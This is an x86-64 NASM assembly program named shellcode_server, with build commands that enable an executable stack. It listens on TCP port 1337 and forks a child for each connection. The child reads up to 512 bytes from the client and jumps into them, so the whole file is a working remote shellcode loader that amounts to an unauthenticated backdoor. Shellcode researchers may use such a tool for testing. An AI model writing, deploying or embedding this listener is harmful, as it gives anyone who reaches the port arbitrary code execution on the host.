; coded by mmxm (@hc0d3r)
; [mmxm@hc0d3r asm]$ nasm -f elf64 shellcode_server.asm
; [mmxm@hc0d3r asm]$ ld -o shellcode_server shellcode_server.o -z execstack


LISTEN_PORT equ 1337

section .text
  global _start
_start:
  mov rbp, rsp

  sub rsp, 28

  mov rax, 41; sys_socket
  mov rdi, 2 ; AF_INET
  mov rsi, 1 ; SOCK_STREAM
  mov rdx, 6 ; IPPROTO_TCP

  syscall

  cmp eax, 0
  jl die


  mov [rbp-4], eax ; store the socket value :D


  mov dword [rbp-8], 1 ; setopt

  mov rax, 54
  mov rdi, [dword rbp-4]
  mov rsi, 1
  mov rdx, 2
  lea r10, [rbp-8]
  mov r8, 4

  syscall


  xor rcx, rcx
  mov word [rbp-24], 2
  mov dword [rbp-18], ecx
  mov word [rbp-22], ((LISTEN_PORT & 0xff) << 8 | (LISTEN_PORT >> 8))
  mov qword [rbp-16], rcx

  mov rax, 49
  lea rsi, [rbp-24]
  mov rdx, 16
  syscall


  mov rax, 50
  mov rsi, 100
  syscall


happy_loop:

  mov rax, 43
  mov rdi, [dword rbp-4]
  xor rsi, rsi
  xor rdx, rdx

  syscall

  cmp eax, 0
  jl die

  mov dword [rbp-28], eax

  mov rax, 57
  syscall


  cmp rax, 0
  je exec_shellcode



  mov rax, 3
  mov rdi, [dword rbp-28]
  syscall


  jmp happy_loop


exec_shellcode:

  mov rbp, rsp

  sub rsp, 512

  mov rax, 3
  mov rdi, [dword rbp+24]
  syscall



  mov rax, 45
  mov rdi, [dword rbp]
  lea rsi, [rbp-512]
  mov rdx, 512
  xor r10, r10
  xor r8, r8
  xor r9, r9
  syscall


  jmp rsi


  mov rax, 3
  mov rdi, [dword rbp]
  syscall


die:
  xor rax, rax
  mov rdi, rax

  mov al, 60
  mov rdi, 666

  syscall
